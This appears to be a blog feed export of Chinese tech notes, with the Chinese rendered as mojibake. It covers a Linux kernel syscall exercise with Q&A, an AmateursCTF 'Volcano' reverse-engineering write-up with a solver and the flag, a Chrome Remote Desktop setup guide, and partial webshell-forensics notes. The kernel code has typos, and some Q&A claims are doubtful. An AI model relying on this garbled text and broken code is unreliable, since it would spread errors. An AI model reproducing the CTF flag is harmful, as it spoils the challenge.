href="#ç¨‹å¼ç¢¼" class="headerlink" title="ç¨‹å¼ç¢¼"></a>ç¨‹å¼ç¢¼</h1><ul><li><p>user space</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs !">æ’°å¯« tmp/test.c <br>userå‘¼å«ä¸‰å€‹ç·šç¨‹ï¼Œåˆ†åˆ¥å‘¼å«syscall 318<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-type">void</span>* <span class="hljs-title function_">thread_func</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start_code_size, start_code_start, start_code_end;<br><span class="hljs-type">int</span> ret;<br><br>ret = syscall(<span class="hljs-number">318</span>,<span class="hljs-number">1</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">pthread_t</span> threadl, thread2, thread3;<br><br>pthread_create(&amp;thread1, <span class="hljs-literal">NULL</span>, thread_func, <span class="hljs-literal">NULL</span>);<br>pthread_create(&amp;thread2, <span class="hljs-literal">NULL</span>, thread_func, <span class="hljs-literal">NULL</span>);<br>pthread_create(&amp;thread3, <span class="hljs-literal">NULL</span>, thread func, <span class="hljs-literal">NULL</span>);<br><br>pthread_join(threadl, <span class="hljs-literal">NULL</span>);<br>pthread_join(thread2, <span class="hljs-literal">NULL</span>);<br>pthread_join(thread3, <span class="hljs-literal">NULL</span>) ;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>kernel space</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs !">æ·»åŠ syscall 318 kernel/project.c<br>åˆ©ç”¨task_struct-&gt;mm_struct-&gt;vm_area_structçµæ§‹å»æ‰¾æ‰€æœ‰virtual addressçš„start,end<br>åˆ©ç”¨Printkå°å‡ºæ¯å€‹segmentçš„start,end<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//syscall(318)</span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> _LINUX_PROJECT</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _LINUX PROJECT</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/linkage.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mm.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;asm/uaccess.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">segment</span> <span class="hljs-title">info</span>&#123;</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> end;<br><span class="hljs-type">char</span> type[<span class="hljs-number">16</span>];<br>&#125;;<br><br>asmlinkage <span class="hljs-type">long</span> <span class="hljs-title function_">sys_project</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> segment_info *info)</span>&#123;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm</span> <span class="hljs-title">area</span> <span class="hljs-keyword">struct</span> *<span class="hljs-title">vma</span>;</span><br><br>mm = &amp;current-&gt;mm;<br><span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (vma = mm-&gt;mmap; vma; vma= vma-&gt;vm_next)&#123;<br><br><span class="hljs-keyword">if</span> (vma-&gt;vm_flags &amp; VM_EXEC)&#123;<br>printk(<span class="hljs-string">&quot;Code segment: %lx - %lx\n&quot;</span>, vma-&gt;vm_start,vma-&gt;vm_end);<br><span class="hljs-comment">//strcpy(info[1].type, &quot;code&quot;) ;</span><br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (vma-&gt;vm_flags &amp; VM_WRITE)&#123;<br> <span class="hljs-keyword">if</span> (vma-&gt;vm flags &amp; VM_GROWSDOWN)&#123;<br>printk(<span class="hljs-string">&quot;Stack Segment: %lx - %lx\n&quot;</span>, vma-&gt;vm_start, vma-&gt;vm_end);<br><br><span class="hljs-comment">//strcpy(info[1].type, &quot;Stack&quot;);</span><br> &#125;<span class="hljs-keyword">else</span>&#123;<br>printk(<span class="hljs-string">&quot;Data/Heap Segment: &amp;lx - %lx\n&quot;</span>, vma-&gt;vm_start, vma-&gt;vm_end);<br><span class="hljs-comment">//strcpy(info[1].type, &quot;Data/Heap&quot;);</span><br> &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><br> printk(<span class="hljs-string">&quot;Other Segment: %lx - %lx\n&quot;</span>, vma-&gt;vm_start, vma-&gt;vm_end);<br> <span class="hljs-comment">//strcpy(info[1].type, &quot;Other&quot;) ;</span><br>&#125;<br><span class="hljs-comment">//_put_user(vma-&gt;vm_start, &amp;info[i].start, unsigned long);</span><br><span class="hljs-comment">//_put_user(vma-&gt;vm_end, &amp;info[i].end, unsigned long);</span><br><span class="hljs-comment">//i++;</span><br>&#125;<br><br><span class="hljs-comment">//copy to user(info, info, sizeof(struct segment_info));</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br></code></pre></td></tr></table></figure></li></ul><h1 id="QA"><a href="#QA" class="headerlink" title="QA"></a>QA</h1><ol><li><p>å“ªäº›segmentæ˜¯å…±äº«çš„?</p><blockquote><p>data bss code libaryé€™å››å€‹segmentæ˜¯å…±äº«è¨˜æ†¶é«”ï¼Œstackã€local storageã€heapé€™ä¸‰å€‹segmentå‰‡æ˜¯ä¸ç›¸åŒè¨˜æ†¶é«”ä½ç½®ã€‚</p></blockquote></li><li><p>heapçš„ä½ç½®ä¸ä¸€æ¨£ï¼Œç‚ºä»€éº¼?</p><blockquote><p>å› ç‚º heap å€åŸŸæ˜¯ä¸€å€‹è¨˜æ†¶é«”å€åŸŸï¼Œç”¨æ–¼å‹•æ…‹åˆ†é…è¨˜æ†¶é«”ï¼Œæ¯å€‹ thread éƒ½æœ‰è‡ªå·±çš„ heap å€åŸŸå¯ä»¥ä½¿ç”¨ï¼Œæ‰€ä»¥å®ƒå€‘çš„ä½ç½®æœƒä¸åŒã€‚</p><p>é›–ç„¶heapä½ç½®ä¸ç›¸åŒï¼Œä½†å…¶å¯¦ä¹Ÿæ˜¯å…±äº«çš„ï¼Œå…¶æœƒæ ¹æ“šlibaryæˆ–OSä¸åŒæœƒæœ‰ç‰¹æ®Šçš„æƒ…æ³ï¼Œä¾‹å¦‚linuxæ˜¯ç”¨Cèªè¨€ï¼Œheapæœƒç”¨mallocçš„æ–¹å¼å¯¦åšï¼Œå®ƒæœƒå…ˆå»memory poolæ‰¾ä¸€å€‹å¯ä»¥ä½¿ç”¨çš„è¨˜æ†¶é«”å€å¡Š(free list)ï¼Œæœƒåœ¨å¾free listè£¡é¢åˆ†çµ¦æ¯å€‹ç·šç¨‹heapï¼Œæ‰€ä»¥heapæ®µæœƒæ˜¯ä¸åŒçš„ã€‚</p></blockquote></li><li><p>Thread local storageæ˜¯ç”¨ç”šéº¼æ±è¥¿å¯¦ä½œ?</p><blockquote><p>æœƒä½¿ç”¨__threadï¼Œåœ¨å®£å‘Šçš„æ™‚å€™åŠ __threadå°±ä»£è¡¨é€™å€‹æ±è¥¿æ˜¯TLSã€‚</p></blockquote></li><li><p>æ¯å€‹threadçš„TLSæœƒä¸åŒï¼Œé€™äº›threadä¹‹é–“å¯ä»¥å»å­˜å–å°æ–¹çš„TLSå—?</p><blockquote><p>TLSæ˜¯ä¸åŒçš„ï¼Œä½†æ˜¯ä»–å€‘ä¹‹é–“æ˜¯å¯ä»¥äº’ç›¸å­˜å–çš„ã€‚</p></blockquote></li><li><p>å»ºé€ å¤šåŸ·è¡Œç·’çš„å¯«æ³•æ˜¯?</p><blockquote><p>pthread_createã€‚<br>pthread çš„ pthread_create å‡½æ•¸å¯ä»¥ç”¨ä¾†å»ºç«‹æ–°çš„åŸ·è¡Œç·’ï¼Œä¸¦ä»¥å‡½æ•¸æŒ‡æ¨™æŒ‡å®šå­åŸ·è¡Œç·’æ‰€è¦åŸ·è¡Œçš„å‡½æ•¸ï¼Œå­åŸ·è¡Œç·’åœ¨å»ºç«‹ä¹‹å¾Œï¼Œå°±æœƒä»¥å¹³è¡Œçš„æ–¹å¼åŸ·è¡Œï¼Œåœ¨å­åŸ·è¡Œç·’çš„åŸ·è¡ŒæœŸé–“ï¼Œä¸»åŸ·è¡Œç·’é‚„æ˜¯å¯ä»¥æ­£å¸¸åŸ·è¡Œè‡ªå·±çš„å·¥ä½œï¼Œæœ€å¾Œä¸»åŸ·è¡Œç·’å†ä»¥ pthread_join å‡½æ•¸ç­‰å¾…å­åŸ·è¡Œç·’åŸ·è¡ŒçµæŸï¼Œè™•ç†å¾ŒçºŒæ”¶å°¾çš„å‹•ä½œã€‚</p><p>åƒè€ƒè³‡æ–™:<br><a href="https://ascii-iicsa.blogspot.com/2011/10/thread-local-storage.html">https://ascii-iicsa.blogspot.com/2011/10/thread-local-storage.html</a></p></blockquote></li><li><p>pthread_createå‡½æ•¸æœƒå»ä½¿ç”¨ä»€éº¼system call?å¦‚ä½•èª¿ç”¨?</p><blockquote><p>pthread_createæœƒä½¿ç”¨clone()é€™å€‹system callï¼Œclone()æœƒå†å»call do_forké€™å€‹functionï¼Œdo_forkæœƒå†å»call copy_processï¼Œcopy_processä¸­æœ‰å€‹copy_mmï¼Œlinuxå¯¦åšå…±äº«è¨˜æ†¶é«”çš„éƒ¨åˆ†å°±æ˜¯é copy_mmé”æˆã€‚</p></blockquote></li><li><p>ç‚ºä»€éº¼è¦ä½¿ç”¨copy from user?</p><blockquote><p>åŸç†:å› ç‚ºå®‰å…¨æ©Ÿåˆ¶çš„è€ƒé‡ï¼Œç¨‹å¼è¼‰å…¥çš„è³‡æ–™ä¸æœƒé¦¬ä¸Šæ”¾åˆ°è¨˜æ†¶é«”ä¸Šï¼Œæœƒä¸€ç›´ç­‰åˆ°çœŸçš„ä½¿ç”¨çš„æ™‚å€™æ‰æ”¾åˆ°è¨˜æ†¶é«”ä¸Šã€‚kernelè¦å»ä½¿ç”¨é€™å€‹è³‡æ–™çš„æ™‚å€™å‡å¦‚ä¸åœ¨è¨˜æ†¶é«”ä¸Šï¼Œé€™ç¨®æ™‚å€™kernelæœƒç›´æ¥crashã€‚</p><p>copy_from_useré¦–å…ˆæœƒæª¢æŸ¥å‚³å…¥åœ°å€çš„åˆæ³•æ€§ï¼Œæª¢æŸ¥å¾Œåˆæ³•æ‰æœƒå»åšcopyï¼ŒåŒæ™‚ä¹Ÿæœ‰ä¿®å¾©æ©Ÿåˆ¶é¿å…ç³»çµ±ç›´æ¥crashã€‚</p><p>é€™å€‹å•é¡Œä¸»è¦æ¶‰åŠåˆ°2å€‹å±¤é¢ï¼Œä¸€å€‹æ˜¯copy_from_user()æœ‰è‡ªå¸¶çš„access_okæª¢æŸ¥ï¼Œå¦‚æœç”¨æˆ¶å‚³é€²ä¾†çš„bufferä¸å±¬æ–¼ç”¨æˆ¶ç©ºé–“è€Œæ˜¯å…§æ ¸ç©ºé–“ï¼Œæ ¹æœ¬ä¸æœƒæ‹·è²ï¼›äºŒæ˜¯copy_from_user()æœ‰è‡ªå¸¶çš„page faultå¾Œexceptionä¿®å¾©æ©Ÿåˆ¶ã€‚</p></blockquote></li></ol>]]></content>
    
    
    <categories>
      
      <category>ç­†è¨˜</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
      <tag>nycu</tag>
      
      <tag>Note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Rev-AmateursCTF2023-Volcano</title>
    <link href="/2023/07/27/Rev-AmateursCTF2023-Volcano/"/>
    <url>/2023/07/27/Rev-AmateursCTF2023-Volcano/</url>
    
    <content type="html"><![CDATA[<ul><li>DIE<br><img src="https://i.imgur.com/21DREUc.png" alt="Image"></li></ul><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">é€é_libc_start_mainé€²å…¥main <span class="hljs-keyword">function</span>ï¼Œæ ¹æ“šé¡Œç›®ï¼Œçµ¦ä»–éœ€è¦çš„bearä»¥åŠvolcanoï¼Œæœ€å¾Œå†æ‰¾å‡ºç¬¦åˆåˆ¤æ–·å¼çš„çµæœã€‚<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/c3mSRqw.png" alt="Image"></p><ul><li><p>sub.c</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs smali"><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#include &lt;stdbool.h&gt;</span><br><span class="hljs-built_in"></span><br><span class="hljs-built_in">int </span>sub_1209(int x) &#123;<br>    <br>   <span class="hljs-built_in"> int </span>v3;<br><br>    v3 = 0;<br><br>    while(x)&#123;<br>        ++v3;<br>        x /= 10;<br>    &#125;<br><br>   <span class="hljs-built_in"> return </span>v3;<br>&#125;<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">int </span>sub_124D(int x) &#123;<br>    <br>   <span class="hljs-built_in"> int </span>v3 = 0;<br><br>    while (x)&#123;<br>        v3 += x % 10;<br>        x /= 10;<br>    &#125;<br>   <span class="hljs-built_in"> return </span>v3;<br>&#125;<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">int </span>sub_1430(int a,<span class="hljs-built_in"> int </span>b,<span class="hljs-built_in"> int </span>c) &#123;<br>    <br>   <span class="hljs-built_in"> int </span>v5;<br>   <span class="hljs-built_in"> int </span>v6 = 1;<br>    v5 = a % c;<br><br>    while (b)&#123;<br>       <span class="hljs-built_in"> if </span>((b&amp;1)!=0)<br>            v6 = v5 * v6%c;<br>        b &gt;&gt;= 1;<br>        v5 = v5 * v5 % c;<br>    &#125;<br>   <span class="hljs-built_in"> return </span>v6;<br>&#125;<br><br>bool isbear(unsigned<span class="hljs-built_in"> int </span>bear)&#123;<br><br>   <span class="hljs-built_in"> if </span>((bear &amp; 1) != 0)<br>       <span class="hljs-built_in"> return </span>false;<br>   <span class="hljs-built_in"> if </span>((bear % 3) !=2)<br>       <span class="hljs-built_in"> return </span>false;<br>   <span class="hljs-built_in"> if </span>((bear % 5) != 1)<br>       <span class="hljs-built_in"> return </span>false;<br>   <span class="hljs-built_in"> if </span>((bear % 7) == 3)<br>       <span class="hljs-built_in"> return </span>bear % 0x6D == 55;<br>    <br>   <span class="hljs-built_in"> return </span>false;<br><br>&#125;<br><br>bool isvol(unsigned<span class="hljs-built_in"> int </span>v)&#123;<br><br><br>    unsigned<span class="hljs-built_in"> int </span>result;<br><br>    result = 0;<br><br>    while (v)&#123;<br>        result += v &amp; 1;<br>        v &gt;&gt;= 1;<br>    &#125;<br><br>   <span class="hljs-built_in"> return </span>result &gt; 0x10 &amp;&amp; result &lt;= 0x1A;<br>&#125;<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">int </span>main() &#123;<br>    <br>   <span class="hljs-built_in"> int </span>v9;<br>   <span class="hljs-built_in"> int </span>v10 = 4919;<br>   <span class="hljs-built_in"> int </span>volcano;<br>   <span class="hljs-built_in"> int </span>bear;<br>    printf(<span class="hljs-string">&quot;Finding numbers that satisfy the conditions...\n&quot;</span>);<br>    <br><br>    for (unsigned<span class="hljs-built_in"> int </span>bear = 0; bear &lt; 1000000; bear++) &#123;<br>       <span class="hljs-built_in"> if </span>(isbear(bear)) &#123;<br>            for (unsigned<span class="hljs-built_in"> int </span>volcano = 0; volcano &lt; 1000000; volcano++) &#123;<br>               <span class="hljs-built_in"> if </span>(isvol(volcano) &amp;&amp;<br>                    sub_1209(volcano) == sub_1209(bear) &amp;&amp;<br>                    sub_124D(volcano) == sub_124D(bear)) &#123;<br>                    for (v9 = 3; v9 &lt; 1000000; v9 += 2) &#123;<br>                       <span class="hljs-built_in"> if </span>(v9 != 1 &amp;&amp;<br>                            sub_1430(v10, volcano, v9) == sub_1430(v10, bear, v9)) &#123;<br>                            printf(<span class="hljs-string">&quot;Found a number that satisfies the conditions: %d\n&quot;</span>, v9);<br>                            printf(<span class="hljs-string">&quot;bear: %u, volcano: %u\n&quot;</span>, bear, volcano);<br>                           <span class="hljs-built_in"> return </span>0;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <br>   <span class="hljs-built_in"> return </span>0;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/mSbkemi.png" alt="Image"></p></li><li><p>FLAG</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">amateursCTF&#123;yep_th0se_l00k_th3_s4me_to_m3!_:clueless:&#125;<br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>REV</category>
      
    </categories>
    
    
    <tags>
      
      <tag>é€†å‘</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GCP å®‰è£ Chrome-Remote-Desktop</title>
    <link href="/2023/07/25/GCP-%E5%AE%89%E8%A3%9D-Chrome-Remote-Desktop/"/>
    <url>/2023/07/25/GCP-%E5%AE%89%E8%A3%9D-Chrome-Remote-Desktop/</url>
    
    <content type="html"><![CDATA[<h1 id="ç’°å¢ƒ"><a href="#ç’°å¢ƒ" class="headerlink" title="ç’°å¢ƒ"></a>ç’°å¢ƒ</h1><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GCP</span> N1<br><span class="hljs-attribute">Ubuntu</span> <span class="hljs-number">22</span>.<span class="hljs-number">04</span> LTS x86_64 <br></code></pre></td></tr></table></figure><h2 id="VPSå®‰è£Chromeé ç«¯æ¡Œé¢"><a href="#VPSå®‰è£Chromeé ç«¯æ¡Œé¢" class="headerlink" title="VPSå®‰è£Chromeé ç«¯æ¡Œé¢"></a>VPSå®‰è£Chromeé ç«¯æ¡Œé¢</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">wget https://<span class="hljs-keyword">dl</span>.google.<span class="hljs-keyword">com</span>/linux/direct/chrome-remote-desktop_current_amd64.<span class="hljs-keyword">deb</span><br><br>sudo apt-<span class="hljs-built_in">get</span> install --assume-yes ./chrome-remote-desktop_current_amd64.<span class="hljs-keyword">deb</span><br></code></pre></td></tr></table></figure><h2 id="å®‰è£æ¡Œé¢ç’°å¢ƒ"><a href="#å®‰è£æ¡Œé¢ç’°å¢ƒ" class="headerlink" title="å®‰è£æ¡Œé¢ç’°å¢ƒ"></a>å®‰è£æ¡Œé¢ç’°å¢ƒ</h2><ul><li><p>æ›´æ–°å­˜å„²åº«</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">sudo apt <span class="hljs-keyword">update</span> <span class="hljs-variable">&amp;&amp;</span> sudo apt upgrade<br></code></pre></td></tr></table></figure></li><li><p>å®‰è£ä¸¦è¨­ç½®é¡¯ç¤ºç®¡ç†å™¨ã€‚ä½¿ç”¨slimæ˜¯å› ç‚ºå®ƒçš„è¼•é‡ç´šç‰¹æ€§</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> slim<br></code></pre></td></tr></table></figure></li><li><p>å®‰è£Ubuntuæ¡Œé¢ç’°å¢ƒ</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> ubuntu-desktop<br></code></pre></td></tr></table></figure></li><li><p>å®‰è£å®Œæˆå¾Œï¼Œé‡å•Ÿæ©Ÿå™¨</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo reboot</span><br></code></pre></td></tr></table></figure></li><li><p>é‡å•Ÿå¾Œæœƒå¤±å»é€£æ¥ã€‚å†æ¬¡é€šé SSH é€²å…¥è™›æ“¬æ©Ÿå•Ÿå‹• slim</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">sudo service slim <span class="hljs-literal">start</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="é…ç½®Chrome-Remote-Desktop"><a href="#é…ç½®Chrome-Remote-Desktop" class="headerlink" title="é…ç½®Chrome-Remote-Desktop"></a>é…ç½®Chrome-Remote-Desktop</h2><ul><li><p>è¨­å®šå…¶ä»–é›»è…¦ï¼Œä¸¦æŒçºŒä¸‹ä¸€æ­¥<br><img src="https://i.imgur.com/L4RwNfq.png" alt="Image"></p></li><li><p>å°‡æœ€å¾Œä¸€æ­¥æŒ‡ä»¤è¤‡è£½åˆ°VPSä¸»æ©Ÿä¸Š<br><img src="https://i.imgur.com/ZHE9iEE.png" alt="Image"></p></li><li><p>è¼¸å…¥å…­ä½æ•¸PINï¼Œå³å¯æˆåŠŸ<br><img src="https://i.imgur.com/ixZP3eZ.png" alt="Image"></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>ç­†è¨˜</category>
      
    </categories>
    
    
    <tags>
      
      <tag>VPS</tag>
      
      <tag>Note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CyberLab-Eventlog</title>
    <link href="/2021/09/17/CyberLab-Eventlog%E5%88%86%E6%9E%90/"/>
    <url>/2021/09/17/CyberLab-Eventlog%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="Cyberlab-event-log-åˆ†æ"><a href="#Cyberlab-event-log-åˆ†æ" class="headerlink" title="Cyberlab event log åˆ†æ"></a>Cyberlab event log åˆ†æ</h1><ul><li>å‡¡èµ°éå¿…ç•™ä¸‹ç—•è·¡<ul><li>File </li><li>Network </li><li>Process&amp;Memory</li></ul></li></ul><h3 id="Threat-hunting"><a href="#Threat-hunting" class="headerlink" title="Threat hunting"></a>Threat hunting</h3><p>æº–å‚™ &gt; åµæ¸¬åˆ†æ &gt; ç§»é™¤å¾©åŸ &gt; å¾ŒçºŒæª¢è¨</p><h3 id="äº‹ä»¶èª¿æŸ¥æ€è·¯"><a href="#äº‹ä»¶èª¿æŸ¥æ€è·¯" class="headerlink" title="äº‹ä»¶èª¿æŸ¥æ€è·¯"></a>äº‹ä»¶èª¿æŸ¥æ€è·¯</h3><ul><li>äºº<ul><li>ç¢ºèªèª°è¢«æ”»æ“Š</li><li>ç¢ºèªæ”»æ“Šä¾†æº</li></ul></li><li>äº‹<ul><li>ç¢ºèªäº‹ä»¶é¡åˆ¥</li><li>éå»æ˜¯å¦ç™¼ç”Ÿé</li></ul></li><li>æ™‚<ul><li>ç¢ºèªæ”»æ“Šæ™‚é–“é»</li></ul></li><li>åœ°<ul><li>ç¢ºèªç™¼ç”Ÿçš„ç¶²æ®µ</li><li>èª°å¯ä»¥å­˜å–</li><li>å¹³æ™‚å¦‚ä½•ç®¡ç†</li></ul></li><li>ç‰©<ul><li>ç¢ºèªæœ‰ç”šéº¼æ±è¥¿ç”¢ç”Ÿ</li><li>ç¢ºèªæ˜¯å¦æœ‰æ±è¥¿æµå‡º</li></ul></li></ul><h3 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h3><ul><li>History&amp;log<ul><li>shell history</li><li>Web accesslog</li><li>Eventlog</li></ul></li><li>Process<ul><li>Services</li><li>Connection</li></ul></li><li>File<ul><li>App(binary,script)</li><li>Autoruns</li><li>Config</li></ul></li></ul><h3 id="linux-forensic-file-webshell"><a href="#linux-forensic-file-webshell" class="headerlink" title="linux forensic (file-webshell)"></a>linux forensic (file-webshell)</h3><ul><li>Web service access logs:<ul><li>mtime n : Fileâ€™s data was last modified n minutes ago</li><li>atime n : File was last accessed n minutes ago.</li></ul></li></ul><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">cat access |<span class="hljs-type">grep</span> -i <span class="hljs-string">&quot;200&quot;</span> |<span class="hljs-type">grep</span> -i <span class="hljs-string">&quot;.php&quot;</span> | <span class="hljs-type">cut</span> -d <span class="hljs-string">&quot; &quot;</span> -f <span class="hljs-number">7</span> |<span class="hljs-type">sort</span> |<span class="hljs-type">uniq</span> -c |<span class="hljs-type">sort</span> -nr |<span class="hljs-type">less</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span 